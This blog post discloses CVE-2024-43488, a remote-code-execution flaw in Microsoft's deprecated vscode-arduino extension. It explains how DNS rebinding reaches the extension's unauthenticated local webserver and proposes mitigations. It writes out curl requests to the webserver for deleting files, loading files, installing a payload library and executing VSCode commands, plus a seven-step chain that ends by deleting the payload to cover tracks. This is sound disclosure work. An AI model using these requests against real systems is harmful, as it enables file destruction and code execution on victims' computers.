---
layout: post
title: "RCE in `vscode-arduino` extension"
date: 2025-11-30 08:30:00 -0600
comments: true
categories: 
---   

## Intro

This is the backstory to [CVE-2024-43488](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43488), which disclosed an RCE vulnerability in [vscode-arduino](https://github.com/microsoft/vscode-arduino).

[vscode-arduino](https://github.com/microsoft/vscode-arduino) was a VSCode extension that added Arduino support. It was developed by Microsoft and had over 2 million installs.

I found and reported this vulnerability 1-2 years ago. The extension was [deprecated](https://github.com/microsoft/vscode-arduino/issues/1757) shortly after reporting.

## Extension design

Users interact with [extension UI](https://github.com/microsoft/vscode-arduino/tree/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/views/app), which sends requests to a local [web server](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduinoContentProvider.ts#L21-L52), which executes [Arduino CLI](https://github.com/arduino/arduino-cli), which handles hardware interaction. All three software components are bundled with the extension.

{% img /images/vscode-arduino-1.png 'Diagram of extension design' 'images' %}

## Vulnerability details

Underpinning the exploit are a few design issues.

1. The extension runs an unauthenticated local webserver, which could be accessed by untrusted websites loaded in the user’s browser.  
2. The webserver exposes access to a CLI tool that was not designed to handle untrusted input.

As a result, remote attackers are exposed to unintended attack surface: bugs and functionality in both Arduino CLI and extension webserver.

{% img /images/vscode-arduino-2.png 'Diagram of malicious access' 'images' %}

The following primitives enable RCE.

### File delete

[Delete](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduino.ts#L312) arbitrary files or directories on the filesystem.

```
curl \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"packagePath": "/tmp/top_secret.txt"}' \
  http://localhost:55842/api/uninstallboard
```

### File load

[Load](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduinoContentProvider.ts#L149) an arbitrary file in the IDE, or open a link in a browser.

```
curl \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"link": "/tmp/payload.py"}' \
  http://localhost:55842/api/openlink
```

### File write

[Write](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduino.ts#L339-L342) files to the filesystem. This step is a bit more involved.

First, submit a library to [https://github.com/arduino/library-registry](https://github.com/arduino/library-registry). Embed payload files in the library. Libraries that meet [requirements](https://github.com/arduino/library-registry/blob/main/FAQ.md#submission-requirements) are automatically merged into the registry.

Then run the following command, substituting in the library’s name. This [places](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduino.ts#L339-L342) the payload on the target’s computer.

```
curl \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"libraryName": "FastCRC"}' \
  http://localhost:55842/api/installlibrary  
```

### File execute

[Execute](https://github.com/microsoft/vscode-arduino/blob/23ed54b7a39ad1ceaf34ac303e18dce8c1f53a47/src/arduino/arduinoContentProvider.ts#L179) any [VSCode Command](https://code.visualstudio.com/api/extension-guides/command). This includes commands that can run scripts.

```
curl \
  -X POST \
  -H 'Content-Type: application/json' \
  --data '{"command": "python.execInTerminal"}' \
  http://localhost:55842/api/runcommand
```

## Exploit

User browses to attacker’s website, which uses client-side JS to:

1. Port scan for the extension webserver  
2. Open an iframe for `<attacker domain>:<webserver port>`
3. [DNS rebind](https://en.wikipedia.org/wiki/DNS_rebinding) the iframe to `127.0.0.1`
   1. The iframe can send same-origin requests to `<attacker domain>:<webserver port>`, which now translates to `127.0.0.1:<webserver port>`. The iframe’s JS can now access the extension webserver.
4. File-write the payload (a Python script) onto the user’s filesystem  
5. File-load the payload into VSCode  
6. Execute the payload using the `python.execInTerminal` VSCode command
7. Delete the payload to cover tracks

Steps 1-3 are conveniently done using NCC’s [Singularity](https://github.com/nccgroup/singularity/wiki) tool. The remaining are done using the primitives above.

PoC exploit video: [https://youtu.be/nM5W67erswc](https://youtu.be/nM5W67erswc)

PoC exploit code: [https://github.com/ahmsec/poc-cve-2024-43488](https://github.com/ahmsec/poc-cve-2024-43488) (Contact me for access.)

## Mitigations

Here are suggested mitigations for different levels of the ecosystem.

* Extension  
  * Use `postMessage` [message passing](https://code.visualstudio.com/api/extension-guides/webview#scripts-and-message-passing) instead of a webserver for communication between UI and CLI components.
* VSCode  
  * Sandbox extensions; restrict capabilities such as binding to ports.  
* Browsers  
  * Implement [Private Network Access](https://wicg.github.io/private-network-access/) or [Local Network Access](https://wicg.github.io/local-network-access/). These are proposals to restrict public websites from accessing private IP addresses, including handling the DNS rebinding scenario. In their latest release, Google Chrome made [progress](https://developer.chrome.com/release-notes/142?hl=en#local_network_access_restrictions) implementing this, but generally browsers have yet to fully adopt this.
